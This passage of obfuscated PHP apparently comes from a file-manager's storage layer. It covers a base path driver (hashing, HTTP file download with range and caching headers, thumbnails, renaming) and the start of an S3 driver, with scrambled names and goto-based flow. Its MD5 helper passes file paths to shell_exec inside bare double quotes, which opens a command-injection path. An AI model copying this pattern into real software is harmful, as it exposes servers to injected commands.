$Fí‚ßµ´µé + 1); } public function pathFather($C­ƒÓ–ˆÃ²) { $Dë‚Ï‘™¯¤ =& $_SERVER[úÎü]; $C­ƒÓ–ˆÃ² = str_replace($Dë‚Ï‘™¯¤[93], $Dë‚Ï‘™¯¤[8], rtrim($C­ƒÓ–ˆÃ², $Dë‚Ï‘™¯¤[8])); $e•ÊğéåÑ­ = strrpos($C­ƒÓ–ˆÃ², $Dë‚Ï‘™¯¤[8]); if ($e•ÊğéåÑ­ === !1) { return $Dë‚Ï‘™¯¤[33]; } return substr($C­ƒÓ–ˆÃ², 0, $e•ÊğéåÑ­ + 1); } public function hashSimple($B…¨¾®³“Í) { goto cŠšµƒ™Ì£; D¬–éœ½‡ê: $a…‘ø–˜ÓÑ = 200; $aÈ´¶ó…¢ = 50; if ($FîºŸÕÂÇÙ <= $a…‘ø–˜ÓÑ * $aÈ´¶ó…¢) { return $this->hashMd5($B…¨¾®³“Í) . $FîºŸÕÂÇÙ; } goto C‹ÉÌ‘ğâ¸; cŠšµƒ™Ì£: $EªÃœ¬óÜ› =& $_SERVER[úÎü]; if (!$B…¨¾®³“Í) { return md5($EªÃœ¬óÜ›[33]); } $FîºŸÕÂÇÙ = $this->size($B…¨¾®³“Í); goto D¬–éœ½‡ê; C‹ÉÌ‘ğâ¸: $eÔó¶ÍßŸ = intval($FîºŸÕÂÇÙ / $aÈ´¶ó…¢); $F³”ó”†éÇ = $EªÃœ¬óÜ›[33]; for ($a÷‰„–¶åÙ = 0; $a÷‰„–¶åÙ < $aÈ´¶ó…¢; $a÷‰„–¶åÙ++) { $F³”ó”†éÇ .= $this->fileSubstr($B…¨¾®³“Í, $eÔó¶ÍßŸ * $a÷‰„–¶åÙ, $a…‘ø–˜ÓÑ); } goto Bøº ¢¦Ù©; Bøº ¢¦Ù©: $F³”ó”†éÇ .= $this->fileSubstr($B…¨¾®³“Í, $FîºŸÕÂÇÙ - $a…‘ø–˜ÓÑ, $a…‘ø–˜ÓÑ); return md5($F³”ó”†éÇ) . $FîºŸÕÂÇÙ; goto C„øãä»¥Ê; C„øãä»¥Ê: } public static $md5Cache = array(); public function hashMd5($båŒ—™‹ç) { $båŒ—™‹ç = $this->iconvSystem($båŒ—™‹ç); if (isset(self::$md5Cache[$båŒ—™‹ç])) { return self::$md5Cache[$båŒ—™‹ç]; } self::$md5Cache[$båŒ—™‹ç] = $this->hashMd5Shell($båŒ—™‹ç); if (!self::$md5Cache[$båŒ—™‹ç]) { self::$md5Cache[$båŒ—™‹ç] = @md5_file($båŒ—™‹ç); } return self::$md5Cache[$båŒ—™‹ç]; } private function hashMd5Shell($f‡É¨°àª) { goto B‹½‹²ÕÓÚ; B‹½‹²ÕÓÚ: $eòÍÁ©¶ƒ =& $_SERVER[úÎü]; if (!function_exists($eòÍÁ©¶ƒ[94])) { return !1; } $aù’«‚ñ¡æ = array($eòÍÁ©¶ƒ[95], $eòÍÁ©¶ƒ[96]); goto eÑÆĞ¬²«Ş; eÑÆĞ¬²«Ş: $FÆ–ÜËÀ“á = Cache::get($eòÍÁ©¶ƒ[97]); if (!$FÆ–ÜËÀ“á) { $f¯µà†äÆ = BASIC_PATH . $eòÍÁ©¶ƒ[98]; $eŒ†‚ğ‹ = md5_file($f¯µà†äÆ); $FÆ–ÜËÀ“á = $eòÍÁ©¶ƒ[99]; foreach ($aù’«‚ñ¡æ as $DãÁåö’õ) { $bšæ†ŒŒŠê = shell_exec($DãÁåö’õ . "\40\42{$f¯µà†äÆ}\x22"); if ($bšæ†ŒŒŠê && substr(trim($bšæ†ŒŒŠê), 0, 32) == $eŒ†‚ğ‹) { $FÆ–ÜËÀ“á = $DãÁåö’õ; break; } } Cache::set($eòÍÁ©¶ƒ[97], $FÆ–ÜËÀ“á, 3600); } if ($FÆ–ÜËÀ“á == $eòÍÁ©¶ƒ[99]) { return !1; } goto F®‰¾¯êˆ¤; F®‰¾¯êˆ¤: $bšæ†ŒŒŠê = shell_exec($FÆ–ÜËÀ“á . "\40\42{$f‡É¨°àª}\x22"); $bšæ†ŒŒŠê = str_replace($eòÍÁ©¶ƒ[100], $eòÍÁ©¶ƒ[33], $bšæ†ŒŒŠê); return substr($bšæ†ŒŒŠê, 0, 32); goto aš¥—¡ò¡; aš¥—¡ò¡: } public function link($Aˆ§ªœ¢»¦) { return $Aˆ§ªœ¢»¦; } public function fileOut($f‰Ä¬©Æ·, $dÀÃ’¯±‘ = false, $eÁğªÉÜ = false, $f’“ªÈ¹Æ = '') { goto E¢•‹»Ì©; Aåˆ¿¹’ÃÍ: @ob_end_clean(); set_timeout(); $d°¼ñ„àİº = $this->infoFull($f‰Ä¬©Æ·); goto B’ò¬ğ‡ò; bŠ¿˜áÍ›è: header($F‰¹‘½Ç‹[135] . $Eçô¸˜›”); header($F‰¹‘½Ç‹[136]); if (!$dÀÃ’¯±‘ && $fµöÁìáÇƒ == $F‰¹‘½Ç‹[137]) { if ($Eçô¸˜›” > 1024 * 1024 * 5) { die; } $A˜¸‹Ê¶ƒ = $this->getContent($f‰Ä¬©Æ·); $A˜¸‹Ê¶ƒ = Html::clearSVG($A˜¸‹Ê¶ƒ); header($F‰¹‘½Ç‹[138] . strlen($A˜¸‹Ê¶ƒ)); echo $A˜¸‹Ê¶ƒ; die; } goto dŞÌŞÌæï×; a‹ˆùï»‘: $aó«•ö£Í  = $this->getType() == $F‰¹‘½Ç‹[102]; $D×ïŒÀÎõ³ = $GLOBALS[$F‰¹‘½Ç‹[6]][$F‰¹‘½Ç‹[84]][$F‰¹‘½Ç‹[103]][$F‰¹‘½Ç‹[104]]; $BêÊ¬ ô½è = (double) $GLOBALS[$F‰¹‘½Ç‹[6]][$F‰¹‘½Ç‹[84]][$F‰¹‘½Ç‹[103]][$F‰¹‘½Ç‹[105]] * 1024 * 1024; goto Aåˆ¿¹’ÃÍ; BºÖƒÒÒÒ: $aÑ‚æòÜ…´ = get_file_mime($fµöÁìáÇƒ); if (strstr($aÑ‚æòÜ…´, $F‰¹‘½Ç‹[114])) { $aÑ‚æòÜ…´ = $aÑ‚æòÜ…´ . $F‰¹‘½Ç‹[115]; } if ($dÀÃ’¯±‘ === !1 && !mime_support($aÑ‚æòÜ…´)) { $dÀÃ’¯±‘ = !0; $aÑ‚æòÜ…´ = $F‰¹‘½Ç‹[116]; } goto e¨©‚™µ¢; A½¾÷í˜›Œ: $Bå­¨’ˆğó = $F‰¹‘½Ç‹[113] . $Bå­¨’ˆğó . $F‰¹‘½Ç‹[119] . $Bå­¨’ˆğó; if ($dÀÃ’¯±‘) { header($F‰¹‘½Ç‹[120]); header($F‰¹‘½Ç‹[121] . $Bå­¨’ˆğó); } else { header($F‰¹‘½Ç‹[122] . $Bå­¨’ˆğó); } header($F‰¹‘½Ç‹[123] . gmdate($F‰¹‘½Ç‹[106], time() + 3600 * 24 * 30) . $F‰¹‘½Ç‹[124]); goto eó²¡‹â¼Ä; eó²¡‹â¼Ä: header($F‰¹‘½Ç‹[125]); header($F‰¹‘½Ç‹[126]); header($F‰¹‘½Ç‹[127]); goto Aìš¦×¤›¢; E¢•‹»Ì©: $F‰¹‘½Ç‹ =& $_SERVER[úÎü]; $this->cacheMethod(null, null); if (!$f‰Ä¬©Æ· || !$this->exist($f‰Ä¬©Æ·)) { show_json(LNG($F‰¹‘½Ç‹[101]), !1, $eÁğªÉÜ); } goto a‹ˆùï»‘; aé¬ù¡å¾ö: if (in_array($fµöÁìáÇƒ, array($F‰¹‘½Ç‹[108], $F‰¹‘½Ç‹[109], $F‰¹‘½Ç‹[110], $F‰¹‘½Ç‹[111]))) { $fµöÁìáÇƒ = $F‰¹‘½Ç‹[112]; } if (!$f’“ªÈ¹Æ) { $f’“ªÈ¹Æ = md5($BÅ×â‰ª« . $this->hashSimple($f‰Ä¬©Æ·)); } $f’“ªÈ¹Æ = $F‰¹‘½Ç‹[113] . $f’“ªÈ¹Æ . $F‰¹‘½Ç‹[113]; goto BºÖƒÒÒÒ; D¢Äµ©Ì¤·: header($F‰¹‘½Ç‹[132] . $BÅ×â‰ª« . $F‰¹‘½Ç‹[124]); header($F‰¹‘½Ç‹[133] . $E“åİÉ÷§); header($F‰¹‘½Ç‹[134]); goto bŠ¿˜áÍ›è; fÒ×âš ˜â: $AÚ–½…î§ö = 0; $e¨òÓå·’î = $Eçô¸˜›” - 1; $fµöÁìáÇƒ = $this->ext($E“åİÉ÷§); goto aé¬ù¡å¾ö; B’ò¬ğ‡ò: $Eçô¸˜›” = $d°¼ñ„àİº[$F‰¹‘½Ç‹[77]]; $BÅ×â‰ª« = gmdate($F‰¹‘½Ç‹[106], $d°¼ñ„àİº[$F‰¹‘½Ç‹[107]]); $E“åİÉ÷§ = $eÁğªÉÜ ? $eÁğªÉÜ : $this->iconvApp($d°¼ñ„àİº[$F‰¹‘½Ç‹[28]]); goto fÒ×âš ˜â; Aìš¦×¤›¢: if (isset($_SERVER[$F‰¹‘½Ç‹[128]]) && strtotime($_SERVER[$F‰¹‘½Ç‹[128]]) == $d°¼ñ„àİº[$F‰¹‘½Ç‹[107]]) { header($F‰¹‘½Ç‹[129], !0, 304); die; } if (isset($_SERVER[$F‰¹‘½Ç‹[130]]) && $_SERVER[$F‰¹‘½Ç‹[130]] == $f’“ªÈ¹Æ) { header($F‰¹‘½Ç‹[131] . $f’“ªÈ¹Æ, !0, 304); die; } header($F‰¹‘½Ç‹[131] . $f’“ªÈ¹Æ); goto D¢Äµ©Ì¤·; FÌ‘ØÉÇÊÎ: if ($BêÊ¬ ô½è) { $bÄ‡²íÒÊÉ = intval(1000 * 1000 * ($A²¬Ğõˆ´÷ / $BêÊ¬ ô½è)); } while ($AÚ–½…î§ö <= $e¨òÓå·’î) { $e›“ÏØ˜¤Ÿ = timeFloat(); check_abort(); $B³îëì•‡ƒ = $e¨òÓå·’î - $AÚ–½…î§ö + 1; if ($B³îëì•‡ƒ <= $A²¬Ğõˆ´÷) { $A²¬Ğõˆ´÷ = $B³îëì•‡ƒ; } echo $this->fileSubstr($f‰Ä¬©Æ·, $AÚ–½…î§ö, $A²¬Ğõˆ´÷); $AÚ–½…î§ö += $A²¬Ğõˆ´÷; if ($A²¬Ğõˆ´÷ == $B³îëì•‡ƒ) { $AÚ–½…î§ö = $e¨òÓå·’î + 1; } if ($bÄ‡²íÒÊÉ) { $DÕ–›êÓì… = intval(1000 * 1000 * (timeFloat() - $e›“ÏØ˜¤Ÿ)); $E¤‹™Šà¦â = $bÄ‡²íÒÊÉ - $DÕ–›êÓì…; if ($E¤‹™Šà¦â > 5) { usleep($E¤‹™Šà¦â); } } } goto f‰Äğ“İ¨½; dŞÌŞÌæï×: $CğàôòÒ«Ü = strtolower($_SERVER[$F‰¹‘½Ç‹[139]]); if ($aó«•ö£Í  && $CğàôòÒ«Ü && $D×ïŒÀÎõ³) { if (strstr($CğàôòÒ«Ü, $F‰¹‘½Ç‹[140])) { header($F‰¹‘½Ç‹[141] . $f‰Ä¬©Æ·); } else { if (strstr($CğàôòÒ«Ü, $F‰¹‘½Ç‹[142])) { header($F‰¹‘½Ç‹[143] . $f‰Ä¬©Æ·); } else { if (strstr($CğàôòÒ«Ü, $F‰¹‘½Ç‹[144])) { header($F‰¹‘½Ç‹[145] . $f‰Ä¬©Æ·); } } } if ($BêÊ¬ ô½è) { header($F‰¹‘½Ç‹[146] . $BêÊ¬ ô½è); } return; } if (isset($_SERVER[$F‰¹‘½Ç‹[147]])) { if (preg_match($F‰¹‘½Ç‹[148], $_SERVER[$F‰¹‘½Ç‹[147]], $a§¿ˆˆµÏ¼)) { $AÚ–½…î§ö = intval($a§¿ˆˆµÏ¼[1]); if (!empty($a§¿ˆˆµÏ¼[2])) { $e¨òÓå·’î = intval($a§¿ˆˆµÏ¼[2]); } } header($F‰¹‘½Ç‹[149]); header("\x43\157\156\x74\145\x6e\x74\x2d\x52\x61\x6e\147\x65\x3a\40\142\x79\164\145\x73\40{$AÚ–½…î§ö}\55{$e¨òÓå·’î}\57" . $Eçô¸˜›”); } else { header($F‰¹‘½Ç‹[150]); } goto fŒñËáÌ¯; e¨©‚™µ¢: header($F‰¹‘½Ç‹[117]); header($F‰¹‘½Ç‹[118] . $aÑ‚æòÜ…´); $Bå­¨’ˆğó = rawurlencode($E“åİÉ÷§); goto A½¾÷í˜›Œ; Cí©ÀÀ³Ó•: if ($_SERVER[$F‰¹‘½Ç‹[154]] == $F‰¹‘½Ç‹[155]) { return; } $A²¬Ğõˆ´÷ = 1024 * 100; $bÄ‡²íÒÊÉ = 0; goto FÌ‘ØÉÇÊÎ; fŒñËáÌ¯: $EµõŠÎß‚ = !0; if ($_SERVER[$F‰¹‘½Ç‹[151]] == $F‰¹‘½Ç‹[152] && $Eçô¸˜›” > 1204 * 1024 * 1024 * 2) { $EµõŠÎß‚ = !1; } if ($EµõŠÎß‚) { header($F‰¹‘½Ç‹[153] . ($e¨òÓå·’î - $AÚ–½…î§ö + 1)); } goto Cí©ÀÀ³Ó•; f‰Äğ“İ¨½: } public function fileOutServer($BîÕÏÖõÁ, $FŒ˜ƒ£º»„ = false, $Cá¬ù‡‹¶ = false, $E«›öè¥™Ç = '') { $this->fileOut($BîÕÏÖõÁ, $FŒ˜ƒ£º»„, $Cá¬ù‡‹¶, $E«›öè¥™Ç); } public function fileOutLink($cº½áçã‘‡) { header($_SERVER[úÎü][156] . $cº½áçã‘‡); die; } public function cacheMethod($cŞŸ…Õ¯ì, $eÁöĞÎ, $FÑ•”‚çÏ° = null) { goto AŒï¦£íµ; Bà¬‹çƒ‹: if (!is_null($FÑ•”‚çÏ°)) { $b¥ƒë´×óÎ[$A©Š„¾´] = $FÑ•”‚çÏ°; return; } $aÎÄ¶æ‹ªŸ = isset($b¥ƒë´×óÎ[$A©Š„¾´]) ? $b¥ƒë´×óÎ[$A©Š„¾´] : null; if (!is_null($aÎÄ¶æ‹ªŸ)) { return $aÎÄ¶æ‹ªŸ; } goto dµÑßë¬; AŒï¦£íµ: $fÒäÃŒŠ× =& $_SERVER[úÎü]; static $b¥ƒë´×óÎ = array(); $e°À¡ëŸ˜» = $eÁöĞÎ ? ltrim($this->getPathOuter($eÁöĞÎ), $fÒäÃŒŠ×[8]) : $eÁöĞÎ; goto aÈº—¸…¯; dµÑßë¬: $aÎÄ¶æ‹ªŸ = $this->{$cŞŸ…Õ¯ì}($eÁöĞÎ); $b¥ƒë´×óÎ[$A©Š„¾´] = $aÎÄ¶æ‹ªŸ; return $aÎÄ¶æ‹ªŸ; goto cØì†““«; aÈº—¸…¯: $A©Š„¾´ = $fÒäÃŒŠ×[157] . $cŞŸ…Õ¯ì . $fÒäÃŒŠ×[158] . rtrim($e°À¡ëŸ˜», $fÒäÃŒŠ×[8]); if (is_null($cŞŸ…Õ¯ì)) { $b¥ƒë´×óÎ = array(); return; } if (is_null($eÁöĞÎ)) { unset($b¥ƒë´×óÎ[$A©Š„¾´]); return; } goto Bà¬‹çƒ‹; cØì†““«: } public function fileOutImage($f¥Ğñ³ÍÄŸ, $Bâ‘êà›Æ = 250) { goto D òŒòµ©‘; cÛğÄÔ’Î: if ($B¢Úò¹šÍ[$B…½è­Á¬³[77]] <= 1024 * 50 || $C¨ëåÑ•¸ï || !function_exists($B…½è­Á¬³[164]) || $B¢Úò¹šÍ[$B…½è­Á¬³[165]] == $B…½è­Á¬³[166]) { return $this->fileOut($f¥Ğñ³ÍÄŸ, !1, $A‚¯Õ«–ãÏ); } if (isset($B¢Úò¹šÍ[$B…½è­Á¬³[161]][$B…½è­Á¬³[167]])) { $AÈÚÆßå ‚ = $B¢Úò¹šÍ[$B…½è­Á¬³[161]][$B…½è­Á¬³[167]]; } else { if (isset($B¢Úò¹šÍ[$B…½è­Á¬³[161]][$B…½è­Á¬³[168]])) { $AÈÚÆßå ‚ = $B¢Úò¹šÍ[$B…½è­Á¬³[161]][$B…½è­Á¬³[168]]; } else { $AÈÚÆßå ‚ = md5("{$B¢Úò¹šÍ[$B…½è­Á¬³[28]]}\x5f{$B¢Úò¹šÍ[$B…½è­Á¬³[75]]}\137{$B¢Úò¹šÍ[$B…½è­Á¬³[77]]}"); } } $FÊÕíÕìĞ = "{$AÈÚÆßå ‚}\x5f{$Bâ‘êà›Æ}\56\x70\x6e\x67"; goto aµåƒ§ÄËè; D òŒòµ©‘: $B…½è­Á¬³ =& $_SERVER[úÎü]; if (substr($f¥Ğñ³ÍÄŸ, 0, 4) == $B…½è­Á¬³[144]) { $this->fileOutLink($f¥Ğñ³ÍÄŸ); } $B¢Úò¹šÍ = $this->info($f¥Ğñ³ÍÄŸ); goto F´£÷Ø´ï; aµåƒ§ÄËè: if (!($D¹¥°Ø”ĞÂ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B…½è­Á¬³[169]))) { $FÙ¥ëùÌø“ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B…½è­Á¬³[170]); } else { $FÙ¥ëùÌø“ = KodIO::make($D¹¥°Ø”ĞÂ); } if ($D¹¥°Ø”ĞÂ = IO::fileNameExist($FÙ¥ëùÌø“, $FÊÕíÕìĞ)) { $Cº­›£—›“ = KodIO::make($D¹¥°Ø”ĞÂ); return IO::fileOut($Cº­›£—›“, !1, $A‚¯Õ«–ãÏ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto e‡‡‚Ó; b÷å…èî›†: if (!file_exists($Cº­›£—›“) || filesize($Cº­›£—›“) < 100) { return @file_exists($bŠ÷‡”æ„Œ) ? IO::fileOut($bŠ÷‡”æ„Œ) : $this->fileOut($f¥Ğñ³ÍÄŸ); } if (!($Ağ‰÷Àˆë¬ = IO::move($Cº­›£—›“, $FÙ¥ëùÌø“))) { return IO::fileOut($Cº­›£—›“); } del_file($Cº­›£—›“); goto fÀ•¬ø‘‡Â; e‡‡‚Ó: $Cº­›£—›“ = DATA_THUMB . $FÊÕíÕìĞ; del_file($Cº­›£—›“); if (!@file_exists($Cº­›£—›“)) { $eÙÚâÁÁ±” = TEMP_FILES; if (!is_dir($eÙÚâÁÁ±”)) { mk_dir($eÙÚâÁÁ±”); } $bŠ÷‡”æ„Œ = $eÙÚâÁÁ±” . $AÈÚÆßå ‚ . $B…½è­Á¬³[91] . $B¢Úò¹šÍ[$B…½è­Á¬³[165]]; if (!@file_exists($bŠ÷‡”æ„Œ)) { $bŠ÷‡”æ„Œ = $this->download($f¥Ğñ³ÍÄŸ, $bŠ÷‡”æ„Œ); } $fØ“±êåÛĞ = new ImageThumb($bŠ÷‡”æ„Œ, $B…½è­Á¬³[171]); $fØ“±êåÛĞ->prorate($Cº­›£—›“, $Bâ‘êà›Æ, $Bâ‘êà›Æ * 10); } goto b÷å…èî›†; F´£÷Ø´ï: $A‚¯Õ«–ãÏ = $B¢Úò¹šÍ[$B…½è­Á¬³[28]]; $C¨ëåÑ•¸ï = !1; if (isset($GLOBALS[$B…½è­Á¬³[159]]) && $GLOBALS[$B…½è­Á¬³[159]][$B…½è­Á¬³[75]] == $B¢Úò¹šÍ[$B…½è­Á¬³[75]]) { $eæ¦Õğ¹£ = $GLOBALS[$B…½è­Á¬³[159]][$B…½è­Á¬³[160]]; if (!$B¢Úò¹šÍ[$B…½è­Á¬³[161]]) { $B¢Úò¹šÍ[$B…½è­Á¬³[161]] = $GLOBALS[$B…½è­Á¬³[159]]; } if (isset($eæ¦Õğ¹£[$B…½è­Á¬³[162]])) { if ($eæ¦Õğ¹£[$B…½è­Á¬³[162]] <= $Bâ‘êà›Æ && $eæ¦Õğ¹£[$B…½è­Á¬³[163]] <= $Bâ‘êà›Æ) { $C¨ëåÑ•¸ï = !0; } } $A‚¯Õ«–ãÏ = $B¢Úò¹šÍ[$B…½è­Á¬³[161]][$B…½è­Á¬³[28]]; } goto cÛğÄÔ’Î; fÀ•¬ø‘‡Â: IO::fileOut($Ağ‰÷Àˆë¬); goto b¸¡œŒ­Š¡; b¸¡œŒ­Š¡: } public function fileOutImageServer($B‹…Š¼Õ©Æ, $f²ã´¹Ëá = 250) { $this->fileOutImage($B‹…Š¼Õ©Æ, $f²ã´¹Ëá); } public function fileNameAuto($b½š—‡ìÀÇ, $dî¦ìÖ¶÷, $cêÑƒ…ÊèÁ = REPEAT_RENAME, $Ağˆ¨Ä¢ÉÓ = false) { goto EÖİˆíôñ›; EÁÇñ¢Á: $F‹¾•öÎ•» = 1; $BÊ©Ä´èä® = substr($dî¦ìÖ¶÷, 0, strlen($dî¦ìÖ¶÷) - strlen($b§ÀÛî£Å÷)); $eÉ¸ùÚÜãµ = $BÊ©Ä´èä® . "\50{$F‹¾•öÎ•»}\51{$b§ÀÛî£Å÷}"; goto CèæŒİÂÖ; açğãŞ¢‚: if ($cêÑƒ…ÊèÁ == REPEAT_SKIP) { return !1; } $b§ÀÛî£Å÷ = $f¨š¢‹ø“Ë[91] . get_path_ext($dî¦ìÖ¶÷); $b§ÀÛî£Å÷ = $b§ÀÛî£Å÷ == $f¨š¢‹ø“Ë[91] || $Ağˆ¨Ä¢ÉÓ ? $f¨š¢‹ø“Ë[33] : $b§ÀÛî£Å÷; goto EÁÇñ¢Á; EÖİˆíôñ›: $f¨š¢‹ø“Ë =& $_SERVER[úÎü]; $f±ì³Í•Ñ = $b½š—‡ìÀÇ === $f¨š¢‹ø“Ë[33] ? $dî¦ìÖ¶÷ : rtrim($b½š—‡ìÀÇ, $f¨š¢‹ø“Ë[8]) . $f¨š¢‹ø“Ë[8] . $dî¦ìÖ¶÷; if ($cêÑƒ…ÊèÁ == REPEAT_REPLACE || !$this->exist($f±ì³Í•Ñ) || $Ağˆ¨Ä¢ÉÓ && $cêÑƒ…ÊèÁ != REPEAT_RENAME_FOLDER) { return $dî¦ìÖ¶÷; } goto açğãŞ¢‚; CèæŒİÂÖ: while ($this->exist(rtrim($b½š—‡ìÀÇ, $f¨š¢‹ø“Ë[8]) . $f¨š¢‹ø“Ë[8] . $eÉ¸ùÚÜãµ)) { $eÉ¸ùÚÜãµ = $BÊ©Ä´èä® . "\50{$F‹¾•öÎ•»}\51{$b§ÀÛî£Å÷}"; $F‹¾•öÎ•»++; } return $eÉ¸ùÚÜãµ; goto D®³ˆêÁ¡; D®³ˆêÁ¡: } public function listAllFiles($aè»¬ÈËñ, $F„¾ó³¶š×, $d‰ãÍ°ºÒ = array()) { goto eÕåõÑ”›; A ‚Ô¯­ô: foreach (array_unique($FÌ£äªÓĞì) as $aĞÈ‹ºï¬) { $f’Ø®Ü×¶º = array($eõ¢ˆ ÉÀ[75] => $this->getPathOuter($eõ¢ˆ ÉÀ[8] . $aè»¬ÈËñ . $eõ¢ˆ ÉÀ[8] . $aĞÈ‹ºï¬), $eõ¢ˆ ÉÀ[76] => 1, $eõ¢ˆ ÉÀ[77] => 0); if (substr($aĞÈ‹ºï¬, -1) != $eõ¢ˆ ÉÀ[8]) { $f’Ø®Ü×¶º[$eõ¢ˆ ÉÀ[76]] = 0; $aäñÊßÙ¡ = $this->getPath($aè»¬ÈËñ . $eõ¢ˆ ÉÀ[8] . $aĞÈ‹ºï¬); $f’Ø®Ü×¶º[$eõ¢ˆ ÉÀ[77]] = isset($d‰ãÍ°ºÒ[$aäñÊßÙ¡]) ? $d‰ãÍ°ºÒ[$aäñÊßÙ¡] : $this->size($aäñÊßÙ¡); } $a¤…½Êˆïº[] = $f’Ø®Ü×¶º; } return $a¤…½Êˆïº; goto c‚Ò±ƒÄ¼Í; eÕåõÑ”›: $eõ¢ˆ ÉÀ =& $_SERVER[úÎü]; if (empty($F„¾ó³¶š×)) { return array(); } $FÌ£äªÓĞì = array(); goto d¿ŠŞ¦Ò°¾; d¿ŠŞ¦Ò°¾: $aè»¬ÈËñ = trim($aè»¬ÈËñ, $eõ¢ˆ ÉÀ[8]); foreach ($F„¾ó³¶š× as $aĞÈ‹ºï¬) { $a¯œ¢Û‹¼È = ltrim(substr(trim($aĞÈ‹ºï¬, $eõ¢ˆ ÉÀ[8]), strlen($aè»¬ÈËñ)), $eõ¢ˆ ÉÀ[8]); $FÌ£äªÓĞì = array_merge($FÌ£äªÓĞì, $this->slicePath($a¯œ¢Û‹¼È)); } $a¤…½Êˆïº = array(); goto A ‚Ô¯­ô; c‚Ò±ƒÄ¼Í: } public function slicePath($a„íø•¦µ) { $Cå†ñï­±ã =& $_SERVER[úÎü]; $Cˆêƒ„ø†¥ = explode($Cå†ñï­±ã[8], trim($a„íø•¦µ, $Cå†ñï­±ã[8])); $fßøÎˆ˜×µ = 0; do { ++$fßøÎˆ˜×µ; $e®—È»„¿Ã[] = implode($Cå†ñï­±ã[8], array_slice($Cˆêƒ„ø†¥, 0, $fßøÎˆ˜×µ)) . $Cå†ñï­±ã[8]; } while ($fßøÎˆ˜×µ < count($Cˆêƒ„ø†¥)); $e®—È»„¿Ã[count($Cˆêƒ„ø†¥) - 1] = $a„íø•¦µ; return $e®—È»„¿Ã; } public function getHost() { $câËáíéª‘ =& $_SERVER[úÎü]; $E„¨Ñâ = parse_url(trim($this->domain, $câËáíéª‘[8])); $CôÒÚ¦¾Ğ® = isset($E„¨Ñâ[$câËáíéª‘[172]]) ? $E„¨Ñâ[$câËáíéª‘[172]] : http_type(); $eƒ™Õ”ÄØ‚ = isset($E„¨Ñâ[$câËáíéª‘[173]]) ? $E„¨Ñâ[$câËáíéª‘[173]] : $E„¨Ñâ[$câËáíéª‘[75]]; if (isset($E„¨Ñâ[$câËáíéª‘[174]])) { $eƒ™Õ”ÄØ‚ .= $câËáíéª‘[4] . $E„¨Ñâ[$câËáíéª‘[174]]; } return $CôÒÚ¦¾Ğ® . $câËáíéª‘[175] . $eƒ™Õ”ÄØ‚; } public function pathEncode($Cğ¿İÓº…œ) { $Bá„¨ÇÃ¼¥ =& $_SERVER[úÎü]; return str_replace($Bá„¨ÇÃ¼¥[176], $Bá„¨ÇÃ¼¥[8], rawurlencode($Cğ¿İÓº…œ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($f™¸•ƒ’ì…) { set_timeout(); require_once SDK_DIR . $_SERVER[úÎü][177]; parent::__construct(); $this->_init($f™¸•ƒ’ì…); } public function _init($B„ğÜÏœ„) { foreach ($B„ğÜÏœ„ as $E¢ŒºÇæ¡ => $bÊÚ¨‚¸ù¿) { if (isset($this->{$E¢ŒºÇæ¡})) { $this->{$E¢ŒºÇæ¡} = $bÊÚ¨‚¸ù¿; } } $this->endpoint = $B„ğÜÏœ„[$_SERVER[úÎü][178]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($dµ°äæ¢ãÀ = "\166\x34") { $this->signVer = $dµ°äæ¢ãÀ; $this->client->setSignatureVersion($dµ°äæ¢ãÀ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto b­íÏçäº˜; f¾ÉƒİÀ¿: $FÑ£Ó÷¯— = array($d–Çô‹åØ[184], $d–Çô‹åØ[185], $d–Çô‹åØ[186], $d–Çô‹åØ[187], $d–Çô‹åØ[188]); $bÑÌ…³Â¼¡ = array_diff($FÑ£Ó÷¯—, $C»«ƒ™¤ÀÈ); return empty($bÑÌ…³Â¼¡); goto Dºø¢ ½…; D¦áæàğò§: if ($Có¹áà¢’¸[$d–Çô‹åØ[179]] != $d–Çô‹åØ[180] || $Có¹áà¢’¸[$d–Çô‹åØ[181]] != $d–Çô‹åØ[180]) { return !1; } $C»«ƒ™¤ÀÈ = array_map($d–Çô‹åØ[182], $Có¹áà¢’¸[$d–Çô‹åØ[183]]); if (!is_array($C»«ƒ™¤ÀÈ)) { $C»«ƒ™¤ÀÈ = array(); } goto f¾ÉƒİÀ¿; b­íÏçäº˜: $d–Çô‹åØ =& $_SERVER[úÎü]; $Có¹áà¢’¸ = $this->getBucketCors(); if (!$Có¹áà¢’¸ || !is_array($Có¹áà¢’¸)) { return !1; } goto D¦áæàğò§; Dºø¢ ½…: } public function mkfile($BÅ‚™²Â†ê, $d¦§î®É = '', $EÅïò±¢ºƒ = REPEAT_RENAME) { $Aìˆ ‚Œä = $this->setContent($BÅ‚™²Â†ê, $d¦§î®É); if ($Aìˆ ‚Œä !== !1) { return $this->getPathOuter($BÅ‚™²Â†ê); } return !1; } public function mkdir($b‡Ó¹Š÷ˆ“, $có¼÷÷à = REPEAT_SKIP) { if (empty($b‡Ó¹Š÷ˆ“)) { return !1; } if ($this->_isFolder($b‡Ó¹Š÷ˆ“)) { return $this->getPathOuter($b‡Ó¹Š÷ˆ“); } $DÆè¸ï¦õö = $this->setContent($b‡Ó¹Š÷ˆ“, $_SERVER[úÎü][33], !0); if ($DÆè¸ï¦õö !== !1) { return $this->getPathOuter($b‡Ó¹Š÷ˆ“); } return !1; } public function copyFile($f°²êäéµš, $DÛÒÓöÈ«¯, $Câƒæ­ = array()) { $Bï°„İ¸’‰ =& $_SERVER[úÎü]; $fİ¸†×Ÿ¬œ = $this->objectMeta($f°²êäéµš); if (!$fİ¸†×Ÿ¬œ) { return !1; } if ($fİ¸†×Ÿ¬œ[$Bï°„İ¸’‰[77]] <= 1024 * 1024 * 200) { $BŸ–çÍË‚¤ = $this->client->copyObject($this->bucket, $f°²êäéµš, $this->bucket, $DÛÒÓöÈ«¯, $Bï°„İ¸’‰[189], $Câƒæ­); } else { $BŸ–çÍË‚¤ = $this->client->multiCopyObject($this->bucket, $f°²êäéµš, $this->bucket, $DÛÒÓöÈ«¯, $Câƒæ­); } 